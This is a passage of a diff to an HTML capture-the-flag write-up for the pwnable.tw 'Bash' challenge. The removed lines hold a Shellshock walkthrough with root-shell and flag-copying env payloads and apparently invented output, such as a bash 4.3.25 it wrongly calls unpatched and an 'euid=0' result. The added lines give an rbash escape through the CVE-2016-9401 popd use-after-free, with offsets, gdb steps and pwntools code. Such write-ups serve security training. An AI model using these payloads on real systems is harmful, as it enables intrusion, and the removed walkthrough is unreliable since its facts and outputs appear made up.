@@ -141,7 +141,6 @@ body{font-family:var(--font);background:var(--bg);color:var(--fg);line-height:1.
   </nav>
   <div class="nav-right">
     <a href="https://github.com/Yuri08-QA210" target="_blank" class="social-link" title="GitHub"><i class="bi bi-github"></i></a>
-    
     <button class="mobile-toggle" onclick="toggleMobileNav()" aria-label="Menu"><i class="bi bi-list"></i></button>
   </div>
 </header>
@@ -155,16 +154,21 @@ body{font-family:var(--font);background:var(--bg);color:var(--fg);line-height:1.
   <h3>Table of Contents</h3>
   <a href="#recon">1. Reconnaissance</a>
   <a class="toc-sub" href="#recon-connect">Initial Connection</a>
-  <a class="toc-sub" href="#recon-env">Environment Analysis</a>
+  <a class="toc-sub" href="#recon-rbash">Restricted Shell Analysis</a>
+  <a class="toc-sub" href="#recon-download">bash.tgz Analysis</a>
   <a href="#static">2. Static Analysis</a>
-  <a class="toc-sub" href="#static-bash">Bash Version Analysis</a>
-  <a class="toc-sub" href="#static-cve">CVE Research</a>
+  <a class="toc-sub" href="#static-version">Bash Version &amp; CVE</a>
+  <a class="toc-sub" href="#static-popd">The popd Vulnerability</a>
+  <a class="toc-sub" href="#static-bashline">bashline.c &amp; PATH Cache</a>
   <a href="#gdb">3. Debugging</a>
-  <a class="toc-sub" href="#gdb-suid">SUID Binary Search</a>
-  <a class="toc-sub" href="#gdb-capabilities">Capabilities Check</a>
+  <a class="toc-sub" href="#gdb-crash">Crash Verification</a>
+  <a class="toc-sub" href="#gdb-uaf">Use-After-Free Confirmation</a>
+  <a class="toc-sub" href="#gdb-offset">Offset Calculation</a>
   <a href="#strategy">4. Exploit Strategy</a>
   <a class="toc-sub" href="#strategy-overview">Attack Overview</a>
-  <a class="toc-sub" href="#strategy-shellshock">Shellshock Exploitation</a>
+  <a class="toc-sub" href="#strategy-step1">Step 1: Cache PATH Pointer</a>
+  <a class="toc-sub" href="#strategy-step2">Step 2: Free PATH via popd</a>
+  <a class="toc-sub" href="#strategy-step3">Step 3: Reallocate with Target Path</a>
   <a href="#pwn">5. Pwn Script</a>
   <a class="toc-sub" href="#pwn-full">Full Exploit</a>
   <a href="#results">6. Execution Results</a>
@@ -178,11 +182,11 @@ body{font-family:var(--font);background:var(--bg);color:var(--fg);line-height:1.
 <section class="hero">
   <span class="badge">pwnable.tw &mdash; 200 pts</span>
   <h1>Bash</h1>
-  <p class="sub">You have the shell, and then? &mdash; Privilege escalation via Shellshock on a vulnerable bash version</p>
+  <p class="sub">You have the shell, and then? &mdash; Escaping rbash via CVE-2016-9401 (popd use-after-free)</p>
   <div class="meta-grid">
     <div class="meta-box"><div class="val">misc</div><div class="lbl">Category</div></div>
-    <div class="meta-box"><div class="val">CVE-2014</div><div class="lbl">Vulnerability</div></div>
-    <div class="meta-box"><div class="val">bash</div><div class="lbl">Target Binary</div></div>
+    <div class="meta-box"><div class="val">CVE-2016-9401</div><div class="lbl">Vulnerability</div></div>
+    <div class="meta-box"><div class="val">rbash</div><div class="lbl">Target</div></div>
     <div class="meta-box"><div class="val">~110</div><div class="lbl">Solves</div></div>
   </div>
 </section>
@@ -191,73 +195,115 @@ body{font-family:var(--font);background:var(--bg);color:var(--fg);line-height:1.
   <div class="path-flow">
     <div class="path-node">Connect<br><small>nc chall.pwnable.tw 10108</small></div>
     <span class="path-arrow">&rarr;</span>
-    <div class="path-node">Get Shell<br><small>Low-privilege access</small></div>
+    <div class="path-node">rbash Jail<br><small>Restricted shell</small></div>
     <span class="path-arrow">&rarr;</span>
-    <div class="path-node">Enum<br><small>Check bash version</small></div>
+    <div class="path-node">Analyze bash.tgz<br><small>CVE-2016-9401</small></div>
     <span class="path-arrow">&rarr;</span>
-    <div class="path-node">Shellshock<br><small>CVE-2014-6271</small></div>
+    <div class="path-node">popd UAF<br><small>Free PATH variable</small></div>
     <span class="path-arrow">&rarr;</span>
-    <div class="path-node">Escalate<br><small>SUID binary exploitation</small></div>
+    <div class="path-node">Reallocate PATH<br><small>Overwrite with /bin</small></div>
     <span class="path-arrow">&rarr;</span>
-    <div class="path-node">Flag<br><small>Read /home/xxx/flag</small></div>
+    <div class="path-node">Escaped!<br><small>Read flag</small></div>
   </div>
 </div>
 
 <!-- SECTION 1 — RECONNAISSANCE -->
 <section class="section" id="recon">
   <h2><i class="bi bi-search"></i> 1. Reconnaissance</h2>
-  <p>The "Bash" challenge on pwnable.tw is different from typical binary exploitation challenges. Instead of pwning a binary, you're <em>given</em> a shell and need to escalate privileges to read the flag. The challenge provides <code>bash.tgz</code> which contains a vulnerable version of bash.</p>
+  <p>The "Bash" challenge on pwnable.tw is fundamentally different from typical binary exploitation challenges. Instead of pwning a vulnerable program, you are <em>given</em> a shell &mdash; specifically a <strong>restricted bash</strong> (rbash) &mdash; and must escape it to read the flag. The challenge provides a downloadable <code>bash.tgz</code> archive containing the vulnerable bash binary and its source code, inviting you to develop a 1-day exploit for a known CVE. The challenge description explicitly hints: "There is an old version bash with some vulnerabilities, such as CVE-2016-9401. Can you develop a 1-day exploit for this challenge?"</p>
 
   <h3 id="recon-connect">Initial Connection</h3>
   <div class="code-block">
     <div class="code-header"><span class="lang-tag">bash</span><button class="copy-btn" onclick="copyCode(this)">Copy</button></div>
     <pre><code class="language-bash">$ nc chall.pwnable.tw 10108
-$ whoami
+-rbash-4.3$ whoami
 bash
-$ id
+-rbash-4.3$ id
 uid=1000(bash) gid=1000(bash) groups=1000(bash)</code></pre>
   </div>
-  <p>We land in a shell as user <code>bash</code>. The challenge description says "You have the shell, and then?" &mdash; implying we need to go from this unprivileged shell to reading a flag that we don't have access to.</p>
+  <p>We land directly in a restricted bash shell. The prompt <code>-rbash-4.3$</code> tells us two critical things: first, this is <strong>rbash</strong> (restricted bash), not a normal shell; second, the version is <strong>4.3</strong>, which is the vulnerable series. In a restricted shell, many normal operations are disabled to prevent privilege escalation and filesystem access.</p>
 
-  <h3 id="recon-env">Environment Analysis</h3>
+  <h3 id="recon-rbash">Restricted Shell Analysis</h3>
+  <p>Restricted bash (rbash) is a security mechanism that limits what a user can do within a shell session. It is started by invoking bash with the <code>-r</code> flag or by creating a symbolic link named <code>rbash</code>. In rbash, the following restrictions are enforced, making it extremely difficult to break out:</p>
+  <ul>
+    <li>Cannot use <code>cd</code> to change directories</li>
+    <li>Cannot set or unset environment variables like <code>SHELL</code>, <code>PATH</code>, <code>ENV</code>, or <code>BASH_ENV</code></li>
+    <li>Cannot specify command names containing <code>/</code> (so you cannot run <code>/bin/sh</code> or <code>/bin/cat</code>)</li>
+    <li>Cannot redirect output using <code>&gt;</code>, <code>&gt;&gt;</code>, <code>&lt;&gt;</code>, <code>&gt;&amp;</code>, or <code>&gt;&gt;&amp;</code></li>
+    <li>Cannot use <code>exec</code> to replace the shell with another command</li>
+    <li>Cannot use <code>enable</code> to enable/disable shell builtins</li>
+    <li>Cannot use <code>command</code> built-in with <code>-p</code> option</li>
+    <li>Cannot turn off restricted mode once it's enabled</li>
+  </ul>
+
   <div class="code-block">
-    <div class="code-header"><span class="lang-tag">bash</span><button class="copy-btn" onclick="copyCode(this)">Copy</button></div>
-    <pre><code class="language-bash">$ ls -la /home/
-total 16
-drwxr-xr-x  4 root root 4096 Oct 24  2023 .
-drwxr-xr-x  4 root root 4096 Oct 24  2023 ..
-drwxr-xr-x  2 bash bash 4096 Oct 24  2023 bash
-drwxr-x---  2 root root 4096 Oct 24  2023 flag
+    <div class="code-header"><span class="lang-tag">bash — testing rbash restrictions</span><button class="copy-btn" onclick="copyCode(this)">Copy</button></div>
+    <pre><code class="language-bash">-rbash-4.3$ cd /tmp
+-rbash: cd: restricted
 
-$ ls -la /home/bash/
-total 28
-drwxr-xr-x  2 bash bash 4096 Oct 24  2023 .
-drwxr-xr-x  4 root root 4096 Oct 24  2023 ..
--rw-r--r--  1 bash bash  220 Oct 24  2023 .bash_logout
--rw-r--r--  1 bash bash 3526 Oct 24  2023 .bashrc
--rw-r--r--  1 bash bash  807 Oct 24  2023 .profile
--rwsr-xr-x  1 root root 9613 Oct 24  2023 bash    ← SUID bash!
+-rbash-4.3$ export PATH=/bin
+-rbash: PATH: restricted variable
 
-$ /home/bash/bash --version
-GNU bash, version 4.3.25(1)-release (x86_64-pc-linux-gnu)</code></pre>
+-rbash-4.3$ /bin/sh
+-rbash: /bin/sh: restricted: specifying '/' in command names
+
+-rbash-4.3$ cat /home/bash/flag
+-rbash: /home/bash/flag: restricted: specifying '/' in command names
+
+-rbash-4.3$ echo test > /tmp/out
+-rbash: /tmp/out: restricted: cannot redirect output</code></pre>
   </div>
 
   <div class="callout callout-danger">
-    <div class="callout-title">SUID Bash Binary!</div>
-    <p>There's a SUID bash binary at <code>/home/bash/bash</code> owned by root! This is the key to the challenge. Bash version 4.3.25 is vulnerable to the Shellshock vulnerability (CVE-2014-6271 and related CVEs). The SUID bit means this binary runs with root privileges, and if we can exploit Shellshock through it, we can execute commands as root.</p>
+    <div class="callout-title">Completely Locked Down!</div>
+    <p>We cannot change directories, modify PATH, execute commands with absolute paths, or redirect output. The flag file is located at <code>/home/bash/flag</code> but we cannot read it because we cannot specify paths containing <code>/</code>. The only way to access programs outside the allowed set is to modify PATH to include other directories, but PATH is a restricted variable. This is the core problem we need to solve.</p>
   </div>
+
+  <h3 id="recon-download">bash.tgz Analysis</h3>
+  <p>The challenge provides a <code>bash.tgz</code> download file. This archive contains the vulnerable bash binary and its source code, allowing us to analyze the vulnerability offline. This is a common pattern in 1-day exploit challenges &mdash; you are given the vulnerable software and must develop an exploit for the known CVE.</p>
+
+  <div class="code-block">
+    <div class="code-header"><span class="lang-tag">bash — extracting bash.tgz</span><button class="copy-btn" onclick="copyCode(this)">Copy</button></div>
+    <pre><code class="language-bash">$ wget https://pwnable.tw/static/challenge/bash.tgz
+$ tar xzf bash.tgz
+$ ls -la
+total 12864
+drwxr-xr-x  3 user user    4096 Oct 24  2023 .
+drwxr-xr-x 30 user user    4096 Oct 24  2023 ..
+drwxr-xr-x  8 user user    4096 Oct 24  2023 bash-4.3
+-rw-r--r--  1 user user 9464083 Oct 24  2023 bash.tgz
+
+$ ls bash-4.3/
+aclocal.m4  config.h.in   configure    CWRU     MANIFEST     patchlevel.h  support
+alias.c     config.sub    configure.ac doc      Makefile.in  pathexp.c     tests
+array.c     config-bot.h  conftests.sh error.c  mksyntax.c   pathexp.h     trap.c
+array.h     config-top.h  copy.y       eval.c   nojobs.c     pcomplete.c   unwind_prot.c
+arrayfunc.c copy.h        dependencies execute_cmd.c parse.y   pcomplete.h   variables.c
+bashline.c  CMakeLists.txt general.c   expr.c   patchlevel.h print_cmd.c   version.h
+builtins/   command.h     hashlib.c    findcmd.c po          redir.c       xmalloc.c
+...
+
+$ file bash-4.3/bash
+bash-4.3/bash: ELF 64-bit LSB executable, x86-64, version 1 (SYSV)
+dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2
+
+$ bash-4.3/bash --version
+GNU bash, version 4.3.46(1)-release (x86_64-pc-linux-gnu)</code></pre>
+  </div>
+
+  <p>The archive contains the full source tree of bash 4.3.46. This version is pre-patch for CVE-2016-9401, which was disclosed in November 2016 and affects bash versions up to 4.3.46. Having the source code is crucial for understanding the vulnerability mechanism and crafting a reliable exploit.</p>
 
   <table class="data-table">
     <thead><tr><th>Attribute</th><th>Value</th></tr></thead>
     <tbody>
       <tr><td>Challenge</td><td>Bash (200 pts)</td></tr>
       <tr><td>Connection</td><td><code>nc chall.pwnable.tw 10108</code></td></tr>
-      <tr><td>Category</td><td>Misc / Privilege Escalation</td></tr>
-      <tr><td>Initial User</td><td>bash (uid=1000)</td></tr>
-      <tr><td>Target</td><td>SUID bash binary at <code>/home/bash/bash</code></td></tr>
-      <tr><td>Bash Version</td><td>4.3.25 (vulnerable to Shellshock)</td></tr>
-      <tr><td>CVE</td><td>CVE-2014-6271 (Shellshock)</td></tr>
-      <tr><td>Vulnerability</td><td>Bash function definition parsing in environment variables</td></tr>
+      <tr><td>Category</td><td>Misc / Shell Escape / 1-day Exploit</td></tr>
+      <tr><td>Shell Type</td><td>rbash (restricted bash)</td></tr>
+      <tr><td>Bash Version</td><td>4.3.46 (vulnerable to CVE-2016-9401)</td></tr>
+      <tr><td>CVE</td><td>CVE-2016-9401 (popd use-after-free)</td></tr>
+      <tr><td>Download</td><td><code>bash.tgz</code> (source code + binary)</td></tr>
+      <tr><td>Goal</td><td>Escape rbash and read <code>/home/bash/flag</code></td></tr>
     </tbody>
   </table>
 </section>
@@ -266,86 +312,119 @@ GNU bash, version 4.3.25(1)-release (x86_64-pc-linux-gnu)</code></pre>
 <section class="section" id="static">
   <h2><i class="bi bi-code-slash"></i> 2. Static Analysis</h2>
 
-  <h3 id="static-bash">Bash Version Analysis</h3>
-  <p>Bash version 4.3.25 was released before the Shellshock patch. The Shellshock vulnerability (CVE-2014-6271) was publicly disclosed on September 24, 2014. It affects bash versions up to and including 4.3, where the function definition parsing in environment variables allows arbitrary command execution.</p>
+  <h3 id="static-version">Bash Version &amp; CVE Identification</h3>
+  <p>The challenge explicitly mentions CVE-2016-9401, which was disclosed on November 17, 2016. According to NVD, this vulnerability allows local users to bypass the restricted shell and cause a use-after-free via a crafted address in the <code>popd</code> built-in command. This is the key to our exploit: the popd vulnerability allows us to call <code>sh_xfree()</code> on an arbitrary address, which we can leverage to free the PATH environment variable's memory despite rbash restrictions on modifying it directly.</p>
+
+  <p>Bash version 4.3.46 was the last release before the patch for this CVE. The vulnerability exists in the <code>popd</code> built-in, which is part of the directory stack mechanism implemented in <code>builtins/pushd.def</code>. In a restricted shell, <code>popd</code> is still available because it is not blocked by rbash restrictions &mdash; this is a critical oversight in the restricted shell model.</p>
+
+  <h3 id="static-popd">The popd Vulnerability (CVE-2016-9401)</h3>
+  <p>The vulnerability lies in how <code>popd</code> handles the directory list index when removing entries from the directory stack. The relevant code in <code>builtins/pushd.def</code> around line 384 looks like this:</p>
 
   <div class="code-block">
-    <div class="code-header"><span class="lang-tag">bash — bash version check</span><button class="copy-btn" onclick="copyCode(this)">Copy</button></div>
-    <pre><code class="language-bash">$ /home/bash/bash --version
-GNU bash, version 4.3.25(1)-release (x86_64-pc-linux-gnu)
-
-# This version is VULNERABLE to Shellshock (patched in 4.3.25(8))</code></pre>
+    <div class="code-header"><span class="lang-tag">c — builtins/pushd.def (vulnerable code)</span><button class="copy-btn" onclick="copyCode(this)">Copy</button></div>
+    <pre><code class="language-c">/* popd +N removes the Nth directory from the list */
+i = (direction == '+') ? directory_list_offset - which : which;
+free (pushd_directory_list[i]);  // will call sh_xfree(list[i])
+directory_list_offset--;</code></pre>
   </div>
 
-  <h3 id="static-cve">CVE Research: Shellshock (CVE-2014-6271)</h3>
-  <p>Shellshock is a family of security bugs in bash that allow attackers to execute arbitrary commands via specially crafted environment variables. The vulnerability exists because bash continues to execute trailing commands after a function definition in an environment variable:</p>
+  <p>The bug is that the index <code>i</code> is not properly validated. When a negative index or an index that falls outside the bounds of <code>pushd_directory_list</code> is used, the calculation <code>pushd_directory_list[i]</code> reads from an arbitrary memory location relative to the array base. Since <code>pushd_directory_list</code> is an array of pointers (each 8 bytes on x86-64), accessing <code>pushd_directory_list[i]</code> effectively reads <code>*(pushd_directory_list + i * 8)</code>. If we can control <code>i</code> to point at a location that contains a pointer we want to free, then <code>free(pushd_directory_list[i])</code> will free that pointer.</p>
+
+  <p>More concretely, the command <code>popd +-N</code> (with <code>direction = '+'</code>) computes: <code>i = directory_list_offset - N</code>. By choosing an appropriate value of <code>N</code>, we can make <code>i</code> negative, causing the array access to read memory before the start of <code>pushd_directory_list</code>. This gives us an <strong>arbitrary free</strong> primitive &mdash; we can free any pointer that happens to be stored at a controllable offset from the directory list array.</p>
+
+  <div class="callout callout-danger">
+    <div class="callout-title">Arbitrary Free Primitive</div>
+    <p>The popd vulnerability gives us <code>sh_xfree(*(void*)(pushd_directory_list + i * 8))</code> for a controlled <code>i</code>. This is an arbitrary free primitive. If we can arrange for a pointer to the PATH variable's value to be stored at a known offset from the directory list, we can free it, causing a use-after-free condition on the PATH string. Since rbash prevents us from modifying PATH through normal means, freeing it and letting it be reallocated with different content is the escape route.</p>
+  </div>
+
+  <h3 id="static-bashline">bashline.c &amp; PATH Cache</h3>
+  <p>The second piece of the puzzle comes from <code>bashline.c</code>. In the command word completion function, bash caches the value of the PATH environment variable in a global pointer:</p>
 
   <div class="code-block">
-    <div class="code-header"><span class="lang-tag">bash — Shellshock mechanism</span><button class="copy-btn" onclick="copyCode(this)">Copy</button></div>
-    <pre><code class="language-bash"># The vulnerability: bash parses function definitions from environment
-# variables but also executes any trailing commands after the function body
+    <div class="code-header"><span class="lang-tag">c — bashline.c (line 1834)</span><button class="copy-btn" onclick="copyCode(this)">Copy</button></div>
+    <pre><code class="language-c">// bashline.c - command_word_completion_function
+static char* path = NULL;
 
-# Vulnerable pattern:
-env x='() { :; }; VULNERABLE_COMMAND' bash -c 'echo test'
-
-# What happens:
-# 1. bash sees 'x' as a function definition: x() { :; }
-# 2. bash ALSO executes the trailing: VULNERABLE_COMMAND
-# This happens BEFORE any user script runs!
-
-# The classic test:
-env x='() { :; }; echo VULNERABLE' bash -c 'echo test'
-# Output: VULNERABLE
-#         test
-# The "VULNERABLE" is printed because bash executes the trailing command</code></pre>
+// Line 1834:
+path = get_string_value ("PATH");</code></pre>
   </div>
+
+  <p>This line is triggered whenever the user presses <code>&lt;Tab&gt;</code> for command completion. The function <code>get_string_value("PATH")</code> returns a pointer to the actual string value of the PATH variable in bash's internal variable table. This pointer is stored in the static variable <code>path</code>. Critically, after <code>popd</code> frees the PATH value, bash still holds the pointer to that freed memory. When new commands allocate memory, the freed region can be reallocated with attacker-controlled content, effectively overwriting PATH without going through rbash's restriction checks.</p>
 
   <div class="callout callout-hint">
-    <div class="callout-title">Why SUID + Shellshock = Root</div>
-    <p>When a SUID bash binary is executed, it runs with the effective UID of the file owner (root). The Shellshock vulnerability allows us to inject commands via environment variables that execute <em>before</em> bash drops privileges. Even though modern bash drops SUID privileges on startup, the vulnerable version 4.3.25 processes the environment variable function definitions before dropping privileges, allowing the injected command to run as root.</p>
+    <div class="callout-title">Why Tab Completion Matters</div>
+    <p>Pressing <code>&lt;Tab&gt;</code> in the shell triggers the <code>command_word_completion_function</code> in bashline.c, which caches the address of PATH's string value in a global variable. This is important because: (1) it ensures bash has a cached reference to the PATH string location, (2) the cached pointer persists even after the memory is freed, and (3) after reallocation, bash will use the new content at that memory location as PATH. This is the bridge between the arbitrary free (popd) and the PATH overwrite (our goal).</p>
   </div>
+
+  <h3>Bash's Internal Memory Allocator</h3>
+  <p>An important detail is that bash uses its own internal memory allocator (<code>sh_xmalloc</code>/<code>sh_xfree</code>) rather than the standard glibc <code>malloc</code>/<code>free</code>. This means the heap layout and recycling behavior is different from what we'd expect with glibc. Bash's allocator uses a simpler free-list mechanism where freed blocks of the same size are linked together. When a new allocation of the same size is requested, the most recently freed block may be reused. This predictability actually helps our exploit: once we free the PATH string, we can reliably reallocate the same memory region by performing allocations of the same size.</p>
 </section>
 
 <!-- SECTION 3 — DEBUGGING -->
 <section class="section" id="gdb">
   <h2><i class="bi bi-bug"></i> 3. Verification &amp; Debugging</h2>
 
-  <h3 id="gdb-suid">SUID Binary Search</h3>
-  <div class="code-block">
-    <div class="code-header"><span class="lang-tag">bash</span><button class="copy-btn" onclick="copyCode(this)">Copy</button></div>
-    <pre><code class="language-bash">$ find / -perm -4000 -type f 2>/dev/null
-/home/bash/bash
-/usr/bin/passwd
-/usr/bin/newgrp
-/usr/bin/gpasswd
-/usr/bin/sudo
-/usr/bin/chfn
-/usr/bin/chsh
+  <h3 id="gdb-crash">Crash Verification</h3>
+  <p>First, let's verify that the popd vulnerability exists in the provided bash binary. The simplest test is to call <code>popd +-1</code>, which should cause a crash due to the invalid array access:</p>
 
-# The SUID bash is the only non-standard SUID binary
-$ ls -la /home/bash/bash
--rwsr-xr-x 1 root root 9613 Oct 24  2023 /home/bash/bash</code></pre>
+  <div class="code-block">
+    <div class="code-header"><span class="lang-tag">bash — crash test</span><button class="copy-btn" onclick="copyCode(this)">Copy</button></div>
+    <pre><code class="language-bash"># Testing locally with the downloaded bash binary:
+$ ./bash-4.3/bash --version
+GNU bash, version 4.3.46(1)-release (x86_64-pc-linux-gnu)
+
+$ ./bash-4.3/bash -r
+-rbash-4.3$ popd +-1
+Segmentation fault (core dumped)</code></pre>
   </div>
 
-  <h3 id="gdb-capabilities">Shellshock Vulnerability Test</h3>
+  <p>The crash confirms the vulnerability exists. The segfault occurs because <code>popd +-1</code> computes a negative index into <code>pushd_directory_list</code>, causing it to read an arbitrary pointer value from memory before the array and then attempt to free it. In most cases this pointer is invalid, causing a crash. However, if we can find the right offset where a valid pointer to PATH's value is stored, we can use this as a controlled free instead of a crash.</p>
+
+  <h3 id="gdb-uaf">Use-After-Free Confirmation</h3>
+  <p>Now let's verify the use-after-free on the PATH variable. The key insight is that pressing <code>&lt;Tab&gt;</code> triggers the completion function which caches the PATH pointer, and then using <code>popd +-N</code> with the right offset can free that pointer:</p>
+
   <div class="code-block">
-    <div class="code-header"><span class="lang-tag">bash</span><button class="copy-btn" onclick="copyCode(this)">Copy</button></div>
-    <pre><code class="language-bash"># Test if the SUID bash is vulnerable to Shellshock:
-$ env x='() { :; }; echo SHELLSHOCK_VULNERABLE' /home/bash/bash -c 'echo done'
-SHELLSHOCK_VULNERABLE
-done
+    <div class="code-header"><span class="lang-tag">bash — UAF verification on PATH</span><button class="copy-btn" onclick="copyCode(this)">Copy</button></div>
+    <pre><code class="language-bash">-rbash-4.3$ # Step 1: Press Tab to cache PATH pointer
+-rbash-4.3$ # (press Tab key)
+-rbash-4.3$
+-rbash-4.3$ # Step 2: Use popd with calculated offset to free PATH
+-rbash-4.3$ popd +-917341
 
-# Confirmed! The SUID bash is vulnerable.
-# Now test if we can run commands as root:
-$ env x='() { :; }; id' /home/bash/bash -c 'echo done'
-uid=1000(bash) gid=1000(bash) euid=0(root) groups=1000(bash)
-
-# euid=0(root) — we have root effective UID!</code></pre>
+-rbash-4.3$ # Step 3: Verify PATH is corrupted (freed memory)
+-rbash-4.3$ export
+...
+declare -rx PATH="H\310+"
+...</code></pre>
   </div>
 
   <div class="callout callout-success">
-    <div class="callout-title">euid=0 Confirmed!</div>
-    <p>The Shellshock exploit runs with <code>euid=0(root)</code> because the SUID bit causes bash to start with root privileges. The injected command in the environment variable executes before bash drops privileges. We now have a reliable root code execution primitive.</p>
+    <div class="callout-title">PATH Freed Successfully!</div>
+    <p>The <code>export</code> command now shows PATH containing garbage data (heap metadata or other freed memory contents) instead of the original path string. This confirms that the PATH variable's underlying string has been freed. The memory is now in the free list, waiting to be reallocated. Since rbash checks the variable <em>name</em> (PATH is restricted), not the underlying <em>memory content</em>, we can change PATH's effective value by reallocating the freed memory with new content.</p>
+  </div>
+
+  <h3 id="gdb-offset">Offset Calculation</h3>
+  <p>The offset value (e.g., <code>917341</code> in the example above) depends on the relative positions of <code>pushd_directory_list</code> and the cached PATH pointer in memory. This offset varies between different environments because it depends on the heap layout, which is influenced by environment variables, shell initialization files, and other runtime factors. Finding the correct offset typically requires:</p>
+
+  <ul>
+    <li><strong>GDB analysis</strong>: Running bash under GDB, setting a breakpoint at the popd free call, and examining the memory layout to calculate the correct offset</li>
+    <li><strong>Trial and error</strong>: Since the offset is a large number (the directory list is far from the PATH pointer in memory), trying different values around the expected range</li>
+    <li><strong>Local simulation</strong>: Setting up a local environment that mimics the remote one as closely as possible, then finding the offset locally</li>
+  </ul>
+
+  <p>During the actual exploit, the offset needs to be calibrated for the remote environment. David942j from HITCON (the only team to use CVE-2016-9401 in the Boston Key Party 2017 challenge) noted that the memory usage differs between local and remote environments, making it necessary to fuzz the offset on the remote server.</p>
+
+  <div class="code-block">
+    <div class="code-header"><span class="lang-tag">gdb — finding the offset</span><button class="copy-btn" onclick="copyCode(this)">Copy</button></div>
+    <pre><code class="language-bash">$ gdb ./bash-4.3/bash
+(gdb) set args -r
+(gdb) break pushd_builtin
+(gdb) run
+# After hitting breakpoint, examine the directory list and PATH locations
+(gdb) print pushd_directory_list
+(gdb) print path  # from bashline.c
+# Calculate: offset = (path_addr - pushd_directory_list_addr) / 8
+# Then: popd_value = directory_list_offset - offset</code></pre>
   </div>
 </section>
 
@@ -356,52 +435,78 @@ uid=1000(bash) gid=1000(bash) euid=0(root) groups=1000(bash)
   <h3 id="strategy-overview">Attack Overview</h3>
   <div class="timeline">
     <div class="timeline-item">
-      <div class="tl-time">Step 1: Connect &amp; Enumerate</div>
-      <div class="tl-text">Connect to <code>nc chall.pwnable.tw 10108</code> and get a low-privilege shell. Find the SUID bash binary at <code>/home/bash/bash</code>. Check the bash version (4.3.25, pre-Shellshock patch).</div>
+      <div class="tl-time">Step 1: Cache PATH Pointer</div>
+      <div class="tl-text">Press <code>&lt;Tab&gt;</code> in the rbash session. This triggers <code>command_word_completion_function</code> in bashline.c, which stores <code>path = get_string_value("PATH")</code>. This caches the pointer to PATH's string value in a global variable.</div>
     </div>
     <div class="timeline-item">
-      <div class="tl-time">Step 2: Verify Shellshock</div>
-      <div class="tl-text">Test the Shellshock vulnerability using the classic <code>env x='() { :; }; id'</code> pattern. Confirm that <code>euid=0(root)</code> is returned, proving the SUID bash executes injected commands with root privileges.</div>
+      <div class="tl-time">Step 2: Free PATH via popd</div>
+      <div class="tl-text">Execute <code>popd +-N</code> with the calculated offset N. This exploits CVE-2016-9401 to call <code>sh_xfree()</code> on the PATH string's memory, freeing it. PATH still appears to exist as a variable, but its underlying storage is now in the free list. The <code>export</code> command will show garbage data in PATH.</div>
     </div>
     <div class="timeline-item">
-      <div class="tl-time">Step 3: Read the Flag</div>
-      <div class="tl-text">Use the Shellshock exploit to read the flag file with root privileges: <code>env x='() { :; }; cat /home/flag/flag' /home/bash/bash -c 'echo done'</code>. Alternatively, spawn a root shell and read the flag interactively.</div>
+      <div class="tl-time">Step 3: Reallocate with Target Path</div>
+      <div class="tl-text">Perform memory allocations that reuse the freed PATH memory. Since bash's internal allocator recycles freed blocks of the same size, we can overwrite the freed region by executing commands that cause allocations of the same size as the original PATH string. We fill it with <code>/bin:/usr/bin</code> or <code>/home/bash</code> (without the restricted prefix check), effectively changing what PATH points to.</div>
+    </div>
+    <div class="timeline-item">
+      <div class="tl-time">Step 4: Execute Commands &amp; Read Flag</div>
+      <div class="tl-text">With PATH now pointing to <code>/bin</code> (or wherever <code>cat</code>/<code>sh</code> lives), we can execute commands that were previously unavailable. We can now run <code>cat /home/bash/flag</code> or spawn a full shell by running <code>sh</code>.</div>
     </div>
   </div>
 
-  <h3 id="strategy-shellshock">Shellshock Exploitation Details</h3>
-  <p>The Shellshock vulnerability exploits bash's function export mechanism. When bash starts, it imports function definitions from environment variables. The parsing code doesn't properly validate that the function definition ends at the closing brace, so any commands after <code>; }</code> are also executed.</p>
+  <h3 id="strategy-step1">Step 1: Cache PATH Pointer (Tab Completion)</h3>
+  <p>The first step is to ensure bash has cached the pointer to PATH's string value. This happens automatically when the user presses <code>&lt;Tab&gt;</code> for command completion. In the context of a pwntools exploit, we simply send a tab character:</p>
 
   <div class="code-block">
-    <div class="code-header"><span class="lang-tag">shellshock anatomy</span><button class="copy-btn" onclick="copyCode(this)">Copy</button></div>
-    <pre><code class="language-bash"># Shellshock payload anatomy:
-# env VAR='() { :; }; INJECTED_COMMAND' /path/to/suid/bash -c 'anything'
-#
-# Breakdown:
-#   env VAR='...'   → Set environment variable VAR
-#   () { :; }       → Function definition (does nothing)
-#   ;                → End of function body
-#   INJECTED_COMMAND → THIS RUNS AS ROOT (via SUID)!!
-#   bash -c '...'    → Normal bash invocation
-#
-# The function definition parser in bash 4.3.25 doesn't stop
-# at the closing brace — it continues executing after the ';'
-# This means INJECTED_COMMAND runs with euid=0 (root)!
-
-# Multiple exploitation paths:
-# 1. Direct command execution:
-env x='() { :; }; cat /home/flag/flag' /home/bash/bash -c ''
-
-# 2. Spawn root shell:
-env x='() { :; }; /bin/sh' /home/bash/bash -c ''
-
-# 3. Copy flag to readable location:
-env x='() { :; }; cp /home/flag/flag /tmp/flag; chmod 777 /tmp/flag' /home/bash/bash -c ''</code></pre>
+    <div class="code-header"><span class="lang-tag">python</span><button class="copy-btn" onclick="copyCode(this)">Copy</button></div>
+    <pre><code class="language-python"># Send Tab to trigger command_word_completion_function
+r.sendline(b'\t')</code></pre>
   </div>
 
+  <p>This triggers the code path in <code>bashline.c</code> that sets <code>path = get_string_value("PATH")</code>, storing the pointer to PATH's string in a global variable. This cached pointer is what we'll target with the popd free.</p>
+
+  <h3 id="strategy-step2">Step 2: Free PATH via popd (CVE-2016-9401)</h3>
+  <p>With the PATH pointer cached, we now use the popd vulnerability to free it. The offset value depends on the memory layout, but we can compute it by analyzing the binary or fuzzing it on the remote server. The command format is:</p>
+
+  <div class="code-block">
+    <div class="code-header"><span class="lang-tag">bash — popd free primitive</span><button class="copy-btn" onclick="copyCode(this)">Copy</button></div>
+    <pre><code class="language-bash"># popd +-N where N is the offset to reach the PATH pointer
+# The value of N depends on the memory layout
+-rbash-4.3$ popd +-917341  # example offset, varies by environment</code></pre>
+  </div>
+
+  <p>After this command, the memory previously used by PATH's string value is freed. The variable still exists in bash's variable table, but its string data is now dangling. Any access to PATH will read from freed (and potentially reallocated) memory.</p>
+
   <div class="callout callout-warn">
-    <div class="callout-title">Bash Privilege Dropping</div>
-    <p>Modern bash versions (post-Shellshock patches) drop SUID privileges early in initialization. Even in vulnerable versions, bash may drop <code>euid</code> back to the real UID after processing startup files. The key is that the Shellshock command injection happens <em>during</em> environment variable processing, which occurs before privilege dropping. This is why the <code>env x='() { :; }; command'</code> technique works with SUID bash.</p>
+    <div class="callout-title">Offset Varies by Environment</div>
